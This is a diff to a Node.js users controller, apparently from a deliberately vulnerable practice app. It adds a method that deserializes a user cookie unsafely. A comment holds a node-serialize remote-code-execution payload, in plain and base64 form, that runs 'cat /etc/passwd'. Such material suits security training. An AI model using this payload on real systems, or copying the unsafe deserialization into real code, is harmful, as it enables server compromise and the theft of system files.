@@ -6,7 +6,8 @@ const {
     pingMe,
     readDosAndDonts,
     searchLogs,
-    parseXML
+    parseXML,
+    getDeserializeData
 } = require('../utils/utility');
 
 class UsersController {
@@ -101,7 +102,6 @@ class UsersController {
                         return reject(err);
                     });
             } else {
-                console.log("Here in else");
                 htmlResponse = "<p>Your input contains malicious values, Please try again</p>";
                 return resolve(htmlResponse);
             }
@@ -163,12 +163,10 @@ class UsersController {
             searchLogs(search)
                 .then((result) => {
                     htmlResponse = "<p>" + result + "</p>";
-                    console.log("from controller - htmlResponse : " + htmlResponse);
                     return resolve(htmlResponse);
                 })
                 .catch((err) => {
                     htmlResponse = "<p>" + err + "</p>";
-                    console.log("from controller error - htmlResponse : " + htmlResponse);
                     return reject(htmlResponse);
                 });
 
@@ -198,6 +196,20 @@ class UsersController {
                 return reject(err);
             });
         });
+    }
+
+    deserialization(cookies) {
+        // Payload: base64 of {"fullname":"_$$ND_FUNC$$_function (){ return require('child_process').execSync('cat /etc/passwd').toString(); }()"}
+        //  Actual payload: eyJmdWxsbmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXsgcmV0dXJuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYygnY2F0IC9ldGMvcGFzc3dkJykudG9TdHJpbmcoKTsgfSgpIn0=
+        return new Promise((resolve, reject) => {
+            getDeserializeData(cookies.user)
+                .then((fullname) => {
+                    resolve("<h2>Hi,<b>" + fullname + "<b><h2><br>");
+                }).catch((err) => {
+                    return reject("<h2>Hi,<b>" + err + "<b><h2><br>");
+                })
+        });
+
     }
 }
 
